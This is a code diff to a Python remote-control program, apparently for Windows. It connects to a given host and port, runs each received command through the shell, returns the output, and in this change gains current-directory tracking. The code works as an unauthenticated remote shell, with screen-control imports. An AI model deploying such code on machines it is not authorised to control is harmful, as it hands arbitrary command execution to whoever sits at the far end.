@@ -4,7 +4,7 @@ import struct, math
 import pyautogui as py
 import socket 
 import io
-import wexpect
+import re
 
 PACKET_SIZE = 10000
 
@@ -60,7 +60,7 @@ def recvAll(sckt: socket, n: int) -> bytearray:
 #                                                                                 ^       |             ^
 #                                                                                 |       |             |
 #                                                                           packet length | type of request (0x63 "c", 0x73 "v")
-def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
+def recvPackets(sckt: socket, debug: bool = False) -> tuple:
     try:
         receivedData = b""
         packetHeader = recvAll(sckt, 7)
@@ -92,15 +92,32 @@ def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
     except:
         return 0x00, b"EXIT0x02"
 
+def getCurrentDirectory() -> str:
+    output = subprocess.run("cd", shell=True, capture_output=True)
+    currentDir = (output.stdout[:len(output.stdout)-2]).decode()
+    return currentDir
+
+def checkIfAvailableDirectory(currentDir, cmd) -> bool:
+    command = "dir" + " " + '"' + currentDir + '"'
+    output = subprocess.getoutput(command)
+    if output.find(cmd[3:]) != -1:
+        return True
+    else:
+        return False 
+
+
 # Main server function
 def mainServer(HOST, PORT, debug: bool = False):
     # Create the server-client socket
     clientSocket = connectSocket(HOST, PORT, True)
+
+    command = b""
     startedVideoShare = False
+    currentDirectory = getCurrentDirectory()
 
     while True:
         typeOfRequest, command = recvPackets(clientSocket, True)
-        command = command.decode()
+        command: str = command.decode()
         # DEBUG
         if debug and not command == "":
             print("[DEBUG] Command: ", command, " typeOfRequest: ", typeOfRequest)
@@ -115,15 +132,25 @@ def mainServer(HOST, PORT, debug: bool = False):
         # If the request is a string request (0x63 is "c" in ascii, it stands for char)
         if typeOfRequest == 0x63:
 
-            # Run a command
-            # NOTE:  The subprocess.run call should be deprecated and a suprocess.Popen should be used, still trying to figure it out
+            # Getting current directory
+            if command == "dir":
+                command = command + " " + '"' + currentDirectory + '"'
+            if command == "cd ..":
+                currentDirectory = currentDirectory[:currentDirectory.rfind('\\')]
+            if command.find("cd .") == -1 and command.find("cd") != -1 and not re.match("[A-Z]:", command[3:]) and checkIfAvailableDirectory(currentDirectory, command):
+                currentDirectory = currentDirectory + "\\" + command[3:]
+            if re.match("[A-Z]:", command):
+                currentDirectory = command
+
             output = subprocess.run(command, shell=True, capture_output=True)
             
             # If the commmand has no output
             if output.stdout == b"":
-                sendPackets(clientSocket, b"No output!", 99, True)
+                sendPackets(clientSocket, currentDirectory.encode() + ">".encode(), 99, True)
             else:
-                sendPackets(clientSocket, output.stdout, 99, True)
+                print(output.stdout)
+                finalOutput = output.stdout + "\n".encode() + currentDirectory.encode() + ">".encode()
+                sendPackets(clientSocket, finalOutput, 99, True)
 
             # DEBUG
             if debug and not output.stdout == "":
